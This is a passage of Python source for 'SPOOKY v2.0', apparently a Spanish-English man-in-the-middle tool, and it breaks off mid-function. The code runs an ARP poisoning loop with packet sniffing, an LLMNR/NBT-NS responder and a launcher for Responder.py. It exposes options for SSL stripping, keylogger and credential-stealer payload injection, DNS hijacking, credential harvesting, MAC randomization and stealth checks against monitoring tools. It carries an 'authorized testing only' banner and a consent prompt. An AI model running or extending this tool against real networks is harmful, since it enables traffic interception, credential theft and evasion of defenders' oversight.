        # Run all active plugins
        for plugin in plugins:
            if plugin.enabled:
                try:
                    plugin.execute(pkt, session_data)
                except Exception as e:
                    log(f"[!] Plugin {plugin.name} error: {e}")
        
        # Original detection
        detected = check_packet_for_auth(pkt)
        if detected:
            print(GREEN + f"[!] Indicador de autenticación detectado: {detected}" + RESET)
        
        # Enhanced packet analysis
        analyze_packet_advanced(pkt)
        
        # Print summary (can be disabled in stealth mode)
        if not current_profile or not current_profile.get('stealth', False):
            print(pkt.summary())
            
    except Exception as e:
        log(f"[!] Error in packet handler: {e}")

def analyze_packet_advanced(pkt):
    """Advanced packet analysis with enhanced detection"""
    global session_data
    
    try:
        # DNS analysis
        if pkt.haslayer(DNS):
            if pkt[DNS].qr == 0:  # Query
                qname = pkt[DNSQR].qname.decode() if isinstance(pkt[DNSQR].qname, bytes) else pkt[DNSQR].qname
                session_data['dns_queries'].append({
                    'timestamp': datetime.now().isoformat(),
                    'domain': qname,
                    'source_ip': pkt[IP].src,
                    'query_type': pkt[DNSQR].qtype
                })
        
        # HTTP analysis
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            if pkt[TCP].dport in [80, 8080] or pkt[TCP].sport in [80, 8080]:
                try:
                    payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                    if 'GET ' in payload or 'POST ' in payload:
                        # Extract HTTP request details
                        lines = payload.split('\n')
                        if lines:
                            request_line = lines[0].strip()
                            session_data['http_requests'].append({
                                'timestamp': datetime.now().isoformat(),
                                'source_ip': pkt[IP].src,
                                'request': request_line,
                                'headers': lines[1:10]  # First 10 headers
                            })
                except:
                    pass
        
        # Detect suspicious patterns
        detect_suspicious_traffic(pkt)
        
    except Exception as e:
        log(f"[!] Error in advanced packet analysis: {e}")

def detect_suspicious_traffic(pkt):
    """Detect potentially suspicious traffic patterns"""
    global session_data
    
    suspicious_indicators = []
    
    try:
        # Port scanning detection
        if pkt.haslayer(TCP):
            if pkt[TCP].flags == 2:  # SYN flag only
                session_data.setdefault('syn_packets', defaultdict(list))
                session_data['syn_packets'][pkt[IP].src].append(pkt[TCP].dport)
                
                # Check for port scan pattern (many different ports from same source)
                if len(set(session_data['syn_packets'][pkt[IP].src])) > 10:
                    suspicious_indicators.append(f"Port scan detected from {pkt[IP].src}")
        
        # Large data transfers
        if pkt.haslayer(Raw) and len(pkt[Raw].load) > 1400:  # Near MTU size
            suspicious_indicators.append(f"Large data transfer: {len(pkt[Raw].load)} bytes from {pkt[IP].src}")
        
        # Unusual protocols or ports
        if pkt.haslayer(TCP):
            uncommon_ports = [4444, 5555, 6666, 7777, 8888, 9999, 31337]
            if pkt[TCP].dport in uncommon_ports or pkt[TCP].sport in uncommon_ports:
                suspicious_indicators.append(f"Uncommon port usage: {pkt[TCP].dport} from {pkt[IP].src}")
        
        # Log suspicious activity
        for indicator in suspicious_indicators:
            session_data['suspicious_traffic'].append({
                'timestamp': datetime.now().isoformat(),
                'indicator': indicator,
                'packet_summary': pkt.summary()
            })
            log(f"[⚠️] Suspicious: {indicator}")
            
    except Exception as e:
        log(f"[!] Error detecting suspicious traffic: {e}")


def check_packet_for_auth(pkt):
    """Detect simple auth indicators without extracting secrets.
    Returns a short description string when found, else None.
    """
    raw = None
    try:
        # scapy stores raw payload often in .load
        if hasattr(pkt, 'load'):
            raw = bytes(pkt.load)
        else:
            # try common transports
            if pkt.haslayer('TCP') and pkt['TCP'].payload:
                raw = bytes(pkt['TCP'].payload)
            elif pkt.haslayer('UDP') and pkt['UDP'].payload:
                raw = bytes(pkt['UDP'].payload)
    except Exception:
        raw = None
    if not raw:
        return None
    lower = raw.lower()
    if b'ntlmssp' in lower:
        _log_auth_event('NTLMSSP indicator', pkt)
        return 'NTLMSSP'
    if b'authorization:' in lower:
        _log_auth_event('HTTP Authorization header', pkt)
        return 'HTTP Authorization header'
    if b'www-authenticate' in lower:
        _log_auth_event('WWW-Authenticate header', pkt)
        return 'WWW-Authenticate'
    return None


def _log_auth_event(kind, pkt):
    """Log auth-indicator metadata only. No credentials stored."""
    if not opts.get('log_auth_events'):
        return
    try:
        ts = datetime.now().isoformat()
        src = pkt[IP].src if IP in pkt else 'unknown'
        dst = pkt[IP].dst if IP in pkt else 'unknown'
        summary = pkt.summary() if hasattr(pkt, 'summary') else str(pkt)
        line = f"[{ts}] {kind} from {src} -> {dst} | {summary}"
        with open(opts.get('auth_logfile', 'spooky_auth.log'), 'a') as f:
            f.write(line + "\n")
        log(f"[!] {kind} detectado desde {src} (registrado en {opts.get('auth_logfile')})")
    except Exception:
        pass

# ------------------ Signal handling ------------------
def graceful_exit(signum, frame):
    global stopped, poison_thread, target_mac, gateway_mac
    # show menu (ASCII art printed in print_menu())
    # restore ARP if we have data
    try:
        if target_mac and gateway_mac and opts["iface"] and opts["target"] and opts["gateway"]:
            restore_arp(opts["target"], target_mac, opts["gateway"], gateway_mac, opts["iface"])
    except Exception as e:
        log(f"[!] Error restaurando ARP: {e}")
    # if using tcpdump, terminate process
    try:
        if opts.get("_tcpdump_proc"):
            proc = opts["_tcpdump_proc"]
            if proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=3)
                log("[*] tcpdump detenido.")
    except Exception:
        pass
    # stop responder thread if running
    try:
        if responder_thread is not None and responder_thread.is_alive():
            responder_stop.set()
            responder_thread.join(timeout=2)
            log("[*] Responder detenido.")
    except Exception:
        pass
    # cleanup supervised external responder if any
    try:
        cleanup_responder_supervisor()
    except Exception:
        pass
    # save pcap if captured by scapy
    if captured_packets:
        try:
            wrpcap(opts["pcap"], captured_packets)
            log(f"[*] Guardado {len(captured_packets)} paquetes (scapy) en {opts['pcap']}")
        except Exception as e:
            log(f"[!] Error guardando pcap (scapy): {e}")
    log("[*] Salida limpia. Happy hacking!")
    sys.exit(0)

signal.signal(signal.SIGINT, graceful_exit)
signal.signal(signal.SIGTERM, graceful_exit)

# ------------------ Interactive menu ------------------
def print_menu():
    print(f"{GREEN}🕷️  SPOOKY v2.0 - Configuración Interactiva{RESET}")
    print("Modo interactivo — configura opciones. Escribe el número o comando y presiona Enter.")
    print("Opciones actuales:")
    for k in ("iface","target","gateway","pcap","timeout","interval","only_sniff","use_tcpdump","bpf_filter","enable_logging","log_auth_events","auth_logfile","logfile"):
        print(f"  {k:12s} = {opts[k] if k in opts else ''}")
    print("\nComandos:")
    print("  set iface <iface>        - establecer interfaz (ej: eth0)")
    print("  set target <ip>          - IP objetivo")
    print("  set gateway <ip>         - IP gateway")
    print("  set pcap <file>          - archivo pcap de salida")
    print("  set timeout <secs>       - tiempo de sniff (0 = espera Ctrl+C)")
    print("  set interval <secs>      - intervalo entre ARP poison")
    print("  set filter <BPF expr>    - BPF (ej: 'tcp port 80' o 'host 10.0.2.5')")
    print("  toggle only_sniff        - modo sólo sniff (no ARP poison)")
    print("  toggle use_tcpdump       - usar tcpdump en vez de scapy para capture")
    print("  toggle enable_logging    - activar/desactivar logging a archivo")
    print("  set logfile <file>       - archivo de log")
    print("  show                     - mostrar opciones actuales")
    print("  start                    - iniciar ataque MITM/sniffing)")
    print("  reset_macs               - limpiar MACs resueltas")
    print("  help                     - mostrar este menú")
    print("  module start llmnr       - iniciar LLMNR/NBT-NS responder simple")
    print("  module stop llmnr        - detener LLMNR/NBT-NS responder")
    print("  module run responder     - intentar ejecutar Responder.py si está disponible")
    print("  stats llmnr              - mostrar estadísticas del responder LLMNR")
    print("  exit                     - salir (sin ejecutar)\n")

def interactive_loop():
    print_menu()
    while True:
        try:
            cmd = input("spooky> ").strip()
        except EOFError:
            cmd = "exit"
        if not cmd:
            continue
        parts = cmd.split()
        if parts[0] in ("set",):
            if len(parts) < 3:
                print("Uso: set <opcion> <valor>")
                continue
            key = parts[1].lower()
            value = " ".join(parts[2:])
            if key in ("iface","target","gateway","pcap","bpf_filter","logfile"):
                opts[key] = value
            elif key in ("max_pcap_size_mb","max_pcap_files","require_consent_file"):
                # numeric or path
                if key in ("max_pcap_size_mb","max_pcap_files"):
                    try:
                        opts[key] = int(value)
                    except Exception:
                        print(f"{key} debe ser un entero")
                else:
                    opts[key] = value
            elif key == "timeout":
                try:
                    opts["timeout"] = int(value)
                except:
                    print("timeout debe ser entero.")
            elif key == "interval":
                try:
                    opts["interval"] = float(value)
                except:
                    print("interval debe ser float.")
            else:
                print("Opcion desconocida:", key)
        elif parts[0] == "toggle":
            if len(parts) < 2:
                print("toggle <option>")
                continue
            key = parts[1]
            if key in ("only_sniff","use_tcpdump","enable_logging","log_auth_events"):
                opts[key] = not opts.get(key, False)
            elif key == 'responder_supervise':
                opts['responder_supervise'] = not opts.get('responder_supervise', True)
            else:
                print("Opcion toggle desconocida.")
        elif parts[0] == "show":
            print("\nOpciones actuales:")
            for k in ("iface","target","gateway","pcap","timeout","interval","only_sniff","use_tcpdump","bpf_filter","enable_logging","logfile"):
                print(f"  {k:12s} = {opts[k] if k in opts else ''}")
            print("")
        elif parts[0] == "start":
            # minimal checks
            if not opts["iface"]:
                print("Debes establecer -- iface primero. (set iface <iface>)")
                continue
            if not opts["only_sniff"]:
                if not opts["target"] or not opts["gateway"]:
                    print("Si no estás en only_sniff debes establecer target y gateway.")
                    continue
            # consent gating
            try:
                check_consent_or_raise()
            except Exception as e:
                print(f"Consent requirement failed: {e}")
                continue
            # ask explicit confirmation
            confirm = input("Confirmas ejecutar con permiso? (si/no): ").strip().lower()
            if confirm not in ("si","s","yes","y"):
                print("Aborted by user.")
                continue
            return  # salir del loop y ejecutar
        elif parts[0] == "reset_macs":
            global target_mac, gateway_mac
            target_mac = None
            gateway_mac = None
            print("MACs reseteadas.")
        elif parts[0] == "help":
            print_menu()
        elif parts[0] == "module":
            if len(parts) < 3:
                print("Uso: module <start|stop|run> <name>")
                continue
            action = parts[1]
            name = parts[2]
            if action == "start" and name == "llmnr":
                if responder_thread is not None and responder_thread.is_alive():
                    print("LLMNR responder ya está en ejecución")
                    continue
                try:
                    start_llmnr_responder(opts.get("iface"))
                    print("LLMNR responder iniciado")
                except Exception as e:
                    print(f"Error iniciando llmnr: {e}")
            elif action == "stop" and name == "llmnr":
                stop_llmnr_responder()
                print("LLMNR responder detenido (si estaba activo)")
            elif action == "run" and name == "responder":
                try:
                    run_responder_external()
                except Exception as e:
                    print(f"Error lanzando Responder.py: {e}")
            elif action == "show" and name == "auth-log":
                # optional: support tail parameter: show auth-log [N]
                tail = 50
                if len(parts) >= 4:
                    try:
                        tail = int(parts[3])
                    except Exception:
                        pass
                show_auth_log(tail=tail)
            else:
                print("Módulo desconocido o acción inválida")
        elif parts[0] == "stats":
            if len(parts) < 2:
                print("Uso: stats <name>")
                continue
            if parts[1] == "llmnr":
                print("LLMNR stats:")
                for k, v in llmnr_stats.items():
                    print(f"  {k}: {v}")
            else:
                print("Stats desconocida")
        elif parts[0] in ("exit","quit"):
            log("Saliendo sin ejecutar.")
            sys.exit(0)
        else:
            print("Comando desconocido. Escribe 'help' para ver opciones.")

def parse_cli_args():
    """Parse CLI args and merge into opts. Returns (args, non_interactive)
    non_interactive is True when at least one meaningful option was passed.
    """
    parser = argparse.ArgumentParser(prog="spooky.py", add_help=False)
    parser.add_argument("--iface", help="interface to use")
    parser.add_argument("--target", help="target IP")
    parser.add_argument("--gateway", help="gateway IP")
    parser.add_argument("--pcap", help="pcap output file")
    parser.add_argument("--timeout", type=int, help="sniff timeout seconds")
    parser.add_argument("--interval", type=float, help="poison interval seconds")
    parser.add_argument("--only-sniff", action="store_true", help="only sniff, no poisoning")
    parser.add_argument("--use-tcpdump", action="store_true", help="use tcpdump for capture")
    parser.add_argument("--bpf", help="BPF filter expression for capture")
    parser.add_argument("--no-logging", action="store_true", help="disable logfile")
    parser.add_argument("--logfile", help="log file path")
    parser.add_argument("--max-pcap-size", type=int, help="rotate pcap when size (MB) reached")
    parser.add_argument("--max-pcap-files", type=int, help="number of rotated pcap files to keep")
    parser.add_argument("--require-consent-file", help="path to a consent token file required to run")
    parser.add_argument("--no-responder-supervise", action="store_true", help="do not supervise/restart external Responder")
    parser.add_argument("--responder-restart-limit", type=int, help="how many times to restart responder before giving up")
    parser.add_argument("--show-auth-log", nargs='?', const='50', help="print the auth-log (optionally provide tail lines)")
    parser.add_argument("--yes", "-y", action="store_true", help="assume yes for confirmations")
    parser.add_argument("--dry-run", action="store_true", help="validate settings but do not execute poisoning")
    parser.add_argument("--log-auth", action="store_true", help="log auth-event metadata to file")
    parser.add_argument("--auth-logfile", help="auth events logfile path")
    
    # Enhanced v2.0 arguments
    parser.add_argument("--profile", choices=list(PROFILES.keys()), help="use predefined profile")
    parser.add_argument("--web-dashboard", action="store_true", help="enable web dashboard")
    parser.add_argument("--dashboard-port", type=int, default=5000, help="web dashboard port")
    parser.add_argument("--ssl-strip", action="store_true", help="enable SSL stripping")
    parser.add_argument("--inject-payload", choices=['keylogger', 'beef_hook', 'credential_stealer'], help="enable payload injection")
    parser.add_argument("--stealth", action="store_true", help="enable stealth mode")
    parser.add_argument("--randomize-mac", action="store_true", help="randomize MAC address")
    parser.add_argument("--disable-plugin", action="append", help="disable specific plugin")
    parser.add_argument("--enable-osint", action="store_true", help="enable OSINT lookups")
    parser.add_argument("--target-domains", help="comma-separated list of domains for DNS hijacking")
    parser.add_argument("--ml-analysis", action="store_true", help="enable ML traffic analysis")
    
    # Custom help action
    class CustomHelpAction(argparse.Action):
        def __init__(self, option_strings, dest=argparse.SUPPRESS, default=argparse.SUPPRESS, help=None):
            super(CustomHelpAction, self).__init__(
                option_strings=option_strings,
                dest=dest,
                default=default,
                nargs=0,
                help=help)

        def __call__(self, parser, namespace, values, option_string=None):
            show_enhanced_help()
            parser.exit()

    # allow -h from user with custom colorized help
    parser.add_argument("-h", "--help", action=CustomHelpAction, help="show this colorized help message and exit")
    args, unknown = parser.parse_known_args()

    provided = any([args.iface, args.target, args.gateway, args.pcap, args.timeout is not None,
                    args.interval is not None, args.only_sniff, args.use_tcpdump, args.bpf,
                    args.logfile, args.no_logging, args.dry_run, args.profile, args.web_dashboard,
                    args.ssl_strip, args.inject_payload, args.stealth, args.randomize_mac])

    if args.iface:
        opts["iface"] = args.iface
    if args.target:
        opts["target"] = args.target
    if args.gateway:
        opts["gateway"] = args.gateway
    if args.pcap:
        opts["pcap"] = args.pcap
    if args.timeout is not None:
        opts["timeout"] = args.timeout
    if args.interval is not None:
        opts["interval"] = args.interval
    if args.only_sniff:
        opts["only_sniff"] = True
    if args.use_tcpdump:
        opts["use_tcpdump"] = True
    if args.bpf:
        opts["bpf_filter"] = args.bpf
    if args.no_logging:
        opts["enable_logging"] = False
    if args.logfile:
        opts["logfile"] = args.logfile
    if args.log_auth:
        opts["log_auth_events"] = True
    if args.auth_logfile:
        opts["auth_logfile"] = args.auth_logfile
    if args.max_pcap_size is not None:
        opts["max_pcap_size_mb"] = args.max_pcap_size
    if args.max_pcap_files is not None:
        opts["max_pcap_files"] = args.max_pcap_files
    if args.require_consent_file:
        opts["require_consent_file"] = args.require_consent_file
    if args.no_responder_supervise:
        opts["responder_supervise"] = False
    if args.responder_restart_limit is not None:
        opts["responder_restart_limit"] = args.responder_restart_limit
    
    # Enhanced v2.0 argument processing
    if args.web_dashboard:
        opts["web_dashboard"] = True
        opts["dashboard_port"] = args.dashboard_port
    if args.ssl_strip:
        opts["ssl_strip"] = True
    if args.inject_payload:
        opts["inject_payload"] = args.inject_payload
        session_data.setdefault('active_payloads', []).append(args.inject_payload)
    if args.stealth:
        opts["stealth_mode"] = True
    if args.randomize_mac:
        opts["randomize_mac"] = True
    if args.disable_plugin:
        opts["disabled_plugins"] = args.disable_plugin
    if args.enable_osint:
        opts["enable_osint"] = True
    if args.target_domains:
        opts["target_domains"] = args.target_domains.split(',')
    if args.ml_analysis:
        opts["ml_analysis"] = True
    if args.show_auth_log:
        try:
            tail_n = int(args.show_auth_log)
        except Exception:
            tail_n = 50
        show_auth_log(tail=tail_n)
        # when using --show-auth-log we exit after showing
        sys.exit(0)

    return args, provided

# ------------------ Tcpdump helper ------------------
def start_tcpdump_capture(iface, pcap_file, bpf_filter=""):
    # Requires tcpdump installed and run as root
    if shutil.which("tcpdump") is None:
        raise RuntimeError("tcpdump no encontrado en PATH")
    # Build command safely splitting BPF expression
    cmd = ["tcpdump", "-i", iface, "-w", pcap_file]
    if bpf_filter:
        # shlex.split preserves quoted segments; extend cmd with filter tokens
        try:
            parts = shlex.split(bpf_filter)
        except Exception:
            parts = [bpf_filter]
        cmd.extend(parts)
    log(f"[*] Iniciando tcpdump: {' '.join(cmd)}")
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    opts["_tcpdump_proc"] = proc
    return proc

# ------------------ Main flow ------------------
def init_plugins():
    """Initialize all available plugins"""
    global plugins
    
    plugins = [
        CredentialExtractor(),
        ServiceDetector(),
        SSLStripper(),
        PayloadInjector(),
        AntiDetection(),
        IPv6Handler(),
        OSINTIntegrator()
    ]
    
    log(f"[*] Initialized {len(plugins)} plugins")
    return plugins

def apply_profile_settings(profile_name):
    """Apply settings from a predefined profile"""
    global current_profile, opts
    
    if profile_name not in PROFILES:
        log(f"[!] Profile '{profile_name}' not found")
        return False
    
    current_profile = PROFILES[profile_name].copy()
    log(f"[*] Applied profile: {profile_name}")
    
    # Apply profile-specific settings
    if current_profile.get('stealth'):
        stealth_settings = stealth_mode_settings()
        opts.update(stealth_settings)
        log("[*] Stealth mode activated")
    
    if current_profile.get('ssl_strip'):
        opts['ssl_strip'] = True
        log("[*] SSL stripping enabled")
    
    if current_profile.get('duration'):
        opts['timeout'] = current_profile['duration']
    
    return True

def start_web_dashboard(port=5000):
    """Start the web dashboard in a separate thread"""
    global web_dashboard
    
    if not HAS_FLASK:
        log("[!] Flask not available - web dashboard disabled")
        return None
    
    try:
        web_dashboard = create_web_dashboard()
        
        def run_dashboard():
            web_dashboard.run(host='0.0.0.0', port=port, debug=False)
        
        dashboard_thread = threading.Thread(target=run_dashboard, daemon=True)
        dashboard_thread.start()
        
        log(f"[*] Web dashboard started on http://localhost:{port}")
        return dashboard_thread
        
    except Exception as e:
        log(f"[!] Failed to start web dashboard: {e}")
        return None

def show_enhanced_help():
    """Display colorized help message with better ASCII art"""
    enhanced_ascii = f"""{BOLD}{MAGENTA}
    ╔═══════════════════════════════════════════════════════════════════════╗
    ║                                                                       ║
    ║    ███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗██╗   ██╗               ║
    ║    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝╚██╗ ██╔╝               ║
    ║    ███████╗██████╔╝██║   ██║██║   ██║█████╔╝  ╚████╔╝                ║
    ║    ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔═██╗   ╚██╔╝                 ║
    ║    ███████║██║     ╚██████╔╝╚██████╔╝██║  ██╗   ██║                  ║
    ║    ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝                  ║
    ║                                                                       ║
    ║            🕷️  MITM & Network Analysis Tool v2.0 🕷️                ║
    ║                                                                       ║
    ╚═══════════════════════════════════════════════════════════════════════╝{RESET}

{HEADER}📋 ENHANCED FEATURES:{RESET}
{SUCCESS}🔑 Credential Harvesting    {CYAN}💉 Payload Injection      {WARNING}🛡️  Anti-Detection{RESET}
{INFO}🌐 Web Dashboard            {YELLOW}🔒 SSL Stripping          {MAGENTA}📊 ML Traffic Analysis{RESET}
{GREEN}🎭 MAC Randomization        {BLUE}🌐 IPv6 Support           {RED}🔍 OSINT Integration{RESET}

{HEADER}🚀 USAGE EXAMPLES:{RESET}

{SUCCESS}Basic Usage:{RESET}
{GRAY}sudo python3 spooky.py{RESET}

{INFO}Corporate Profile (Stealth):{RESET}
{GRAY}sudo python3 spooky.py --profile corporate --stealth --web-dashboard{RESET}

{WARNING}Red Team Mode (Full Features):{RESET}
{GRAY}sudo python3 spooky.py --profile red_team --ssl-strip --inject-payload keylogger --randomize-mac{RESET}

{HIGHLIGHT}Forensic Analysis:{RESET}
{GRAY}sudo python3 spooky.py --profile forensics --ml-analysis --enable-osint{RESET}

{HEADER}📝 COMMAND LINE OPTIONS:{RESET}

{SUCCESS}🎯 Core Arguments:{RESET}
{CYAN}  --iface{RESET} INTERFACE          Network interface to use
{CYAN}  --target{RESET} IP               Target IP address
{CYAN}  --gateway{RESET} IP              Gateway IP address
{CYAN}  --timeout{RESET} SECONDS         Sniff timeout in seconds

{INFO}🕷️  MITM Options:{RESET}
{YELLOW}  --only-sniff{RESET}             Sniff only, no poisoning
{YELLOW}  --interval{RESET} FLOAT         ARP poisoning interval
{YELLOW}  --bpf{RESET} FILTER            BPF filter for capture

{WARNING}⚡ Enhanced Features:{RESET}
{MAGENTA}  --profile{RESET} {{corporate,wifi_audit,red_team,forensics}}
{MAGENTA}  --web-dashboard{RESET}          Enable real-time web interface
{MAGENTA}  --dashboard-port{RESET} PORT    Dashboard port (default: 5000)
{MAGENTA}  --ssl-strip{RESET}             Enable HTTPS to HTTP downgrade
{MAGENTA}  --inject-payload{RESET} {{keylogger,beef_hook,credential_stealer}}

{ERROR}🛡️  Stealth & Evasion:{RESET}
{RED}  --stealth{RESET}               Enable stealth mode
{RED}  --randomize-mac{RESET}         Randomize MAC address
{RED}  --disable-plugin{RESET} NAME   Disable specific plugin

{SUCCESS}📊 Analysis & Intelligence:{RESET}
{GREEN}  --ml-analysis{RESET}           Enable ML traffic analysis
{GREEN}  --enable-osint{RESET}          Enable OSINT lookups
{GREEN}  --target-domains{RESET} LIST   Target specific domains

{INFO}💾 Output & Logging:{RESET}
{BLUE}  --pcap{RESET} FILE             Output pcap file
{BLUE}  --logfile{RESET} FILE          Log file path
{BLUE}  --no-logging{RESET}            Disable logging

{HEADER}🔒 SECURITY & ETHICS:{RESET}
{ERROR}⚠️  This tool is for AUTHORIZED TESTING ONLY!{RESET}
{WARNING}📍 Use only in controlled lab environments{RESET}
{INFO}🎓 Educational and defensive security purposes{RESET}

{HEADER}🌐 WEB DASHBOARD:{RESET}
{SUCCESS}Access: http://localhost:5000 (when --web-dashboard enabled){RESET}
{INFO}Features: Real-time stats, credential view, host discovery{RESET}

{GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{BOLD}{CYAN}Developed by Vixy & Rubir0za - Enhanced v2.0 Professional Edition{RESET}
{GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
"""
    print(enhanced_ascii)

def main():
    global poison_thread, stopped, target_mac, gateway_mac, session_data
    
    # Initialize session
    session_data['start_time'] = datetime.now()
    
    # Print compact enhanced banner
    compact_banner = f"""{BOLD}{MAGENTA}
╔═══════════════════════════════════════════════════════════════════════╗
║  ███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗██╗   ██╗                 ║
║  ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝╚██╗ ██╔╝                 ║
║  ███████╗██████╔╝██║   ██║██║   ██║█████╔╝  ╚████╔╝                  ║
║  ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔═██╗   ╚██╔╝                   ║
║  ███████║██║     ╚██████╔╝╚██████╔╝██║  ██╗   ██║                    ║
║  ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝                    ║
║          🕷️  MITM & Network Analysis Tool v2.0 🕷️                  ║
╚═══════════════════════════════════════════════════════════════════════╝{RESET}
{GREEN}📡 Enhanced Professional Cybersecurity Suite{RESET}
{CYAN}🔑 Credential Harvesting • 💉 Payload Injection • 🛡️  Anti-Detection{RESET}
{YELLOW}🌐 Web Dashboard • 🔒 SSL Stripping • 📊 ML Analysis • 🌐 IPv6{RESET}"""
    print(compact_banner)
    print()
    
    # Initialize plugins
    init_plugins()
    
    # Check environment
    cloud_env = detect_cloud_environment()
    if cloud_env:
        print(f"🌩️  Cloud environment detected: {', '.join(cloud_env)}")
    
    # Check for monitoring tools
    anti_detect = AntiDetection()
    monitoring = anti_detect.check_monitoring()
    if monitoring:
        print(f"⚠️  Monitoring tools detected: {len(monitoring)}")
        for tool in monitoring[:3]:  # Show first 3
            print(f"   - {tool['process']} (PID: {tool['pid']})")
    
    # Parse CLI args; if provided run non-interactively
    args, non_interactive = parse_cli_args()
    
    # Check for profile selection
    if hasattr(args, 'profile') and args.profile:
        if apply_profile_settings(args.profile):
            log(f"[*] Using profile: {args.profile}")
    
    if non_interactive:
        # validate minimal params
        if not opts["iface"]:
            print("Error: --iface es obligatorio en modo no interactivo")
            sys.exit(1)
        if not opts["only_sniff"] and (not opts["target"] or not opts["gateway"]):
            print("Error: --target y --gateway son obligatorios si no usas --only-sniff")
            sys.exit(1)
        if args.dry_run:
            print("Dry-run: parámetros validados. No se ejecutará el poisoning.")
            print("Opciones:")
            for k in ("iface","target","gateway","pcap","timeout","interval","only_sniff","use_tcpdump","bpf_filter","enable_logging","logfile"):
                print(f"  {k:12s} = {opts.get(k)}")
            
            # Show active plugins
            print(f"\nPlugins activos: {len([p for p in plugins if p.enabled])}")
            for p in plugins:
                status = "✓" if p.enabled else "✗"
                print(f"  {status} {p.name}: {p.description}")
            
            return
        if not args.yes:
            confirm = input("Confirmas ejecutar con permiso? (si/no): ").strip().lower()
            if confirm not in ("si","s","yes","y"):
                print("Aborted by user.")
                sys.exit(0)
    else:
        # interactive mode with enhancements
        print("SP00KY — herramienta avanzada de Sniffing y MITM")
        print("Nuevas características en v2.0:")
        print("- 🔑 Extracción automática de credenciales")
        print("- 🌐 Dashboard web en tiempo real") 
        print("- 🛡️ Modo sigiloso avanzado")
        print("- 💉 Inyección de payloads")
        print("- 📊 Análisis ML de tráfico")
        print("- 🔍 Integración OSINT")
        print()
        
        # Start web dashboard
        start_web_dashboard()
        
        interactive_loop()

    # apply conf iface
    conf.iface = opts["iface"]
    # consent gating (if configured)
    try:
        check_consent_or_raise()
    except Exception as e:
        log(f"[!] Consent requirement failed: {e}")
        sys.exit(1)

    log("[*] Resolviendo MACs (si aplica)...")
    if not opts["only_sniff"]:
        target_mac = get_mac(opts["target"], opts["iface"])
        gateway_mac = get_mac(opts["gateway"], opts["iface"])
        if not target_mac or not gateway_mac:
            log("[!] No se pudieron resolver MACs. Abortando.")
            sys.exit(1)
        log(f"Target {opts['target']} -> {target_mac}")
        log(f"Gateway {opts['gateway']} -> {gateway_mac}")

    # Start tcpdump if selected
    if opts["use_tcpdump"]:
        # ensure pcap path's parent exists and rotate if needed
        ensure_pcap_parent(opts.get("pcap"))
        rotate_pcap_if_needed(opts.get("pcap"))
        try:
            start_tcpdump_capture(opts["iface"], opts["pcap"], opts["bpf_filter"])
            log("[*] tcpdump activo. Usa Ctrl+C para detener y guardar.")
        except Exception as e:
            log(f"[!] Error iniciando tcpdump: {e}")
            sys.exit(1)

    # Only sniff mode (without poisoning)
    if opts["only_sniff"]:
        log("[*] Modo solo sniffing.")
        stopped = False
        try:
            # Scapy sniff supports filter param for BPF
            sniff(iface=opts["iface"], prn=packet_handler, store=False, timeout=(opts["timeout"] if opts["timeout"]>0 else None), filter=opts["bpf_filter"] or None)
        except Exception as e:
            log(f"[!] Error en sniff (scapy): {e}")
        graceful_exit(None, None)

    # Start ARP poisoning thread
    log("[*] Iniciando ARP poisoning (MITM).")
    stopped = False
    poison_thread = threading.Thread(target=poison_loop, args=(opts["target"], target_mac, opts["gateway"], gateway_mac, opts["iface"], opts["interval"]), daemon=True)
    poison_thread.start()

    # Start sniffing (scapy) unless tcpdump is used
    if not opts["use_tcpdump"]:
        log(f"[*] Iniciando sniffing (scapy). Timeout = {opts['timeout']}s. Filtro BPF: '{opts['bpf_filter']}'")
        try:
            sniff(iface=opts["iface"], prn=packet_handler, store=False, timeout=(opts["timeout"] if opts["timeout"]>0 else None), filter=opts["bpf_filter"] or None)
        except Exception as e:
            log(f"[!] Error en sniff (scapy): {e}")
    else:
        # if tcpdump is in use, wait until timeout or Ctrl+C
        log(f"[*] tcpdump está capturando en background. Timeout = {opts['timeout']}s")
        if opts["timeout"] and opts["timeout"]>0:
            try:
                time.sleep(opts["timeout"])
            except KeyboardInterrupt:
                pass
        else:
            # wait until Ctrl+C
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass

    # Stop poisoning and cleanup
    stopped = True
    if poison_thread is not None:
        poison_thread.join(timeout=3)
    restore_arp(opts["target"], target_mac, opts["gateway"], gateway_mac, opts["iface"])

    # If tcpdump used, try to terminate it nicely
    if opts["use_tcpdump"] and opts.get("_tcpdump_proc"):
        proc = opts["_tcpdump_proc"]
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except Exception:
                proc.kill()
        log("[*] tcpdump detenido al finalizar.")

    # Enhanced cleanup and reporting
    cleanup_and_report()

def cleanup_and_report():
    """Enhanced cleanup with comprehensive reporting"""
    global captured_packets, session_data, opts
    
    try:
        # Save pcap if we captured with scapy
        if captured_packets:
            try:
                ensure_pcap_parent(opts.get("pcap"))
                rotate_pcap_if_needed(opts.get("pcap"))
                wrpcap(opts["pcap"], captured_packets)
                log(f"[*] Guardado {len(captured_packets)} paquetes (scapy) en {opts['pcap']}")
            except Exception as e:
                log(f"[!] Error guardando pcap (scapy): {e}")
        
        # Generate comprehensive report
        log("[*] Generando reporte final...")
        generate_report(session_data)
        
        # Analyze captured traffic
        if opts.get("pcap") and os.path.exists(opts["pcap"]):
            log("[*] Analizando patrones de tráfico...")
            analysis = analyze_traffic_patterns(opts["pcap"])
            if analysis:
                log(f"[*] Análisis completado: {analysis['total_packets']} paquetes")
                if analysis['suspicious_patterns']:
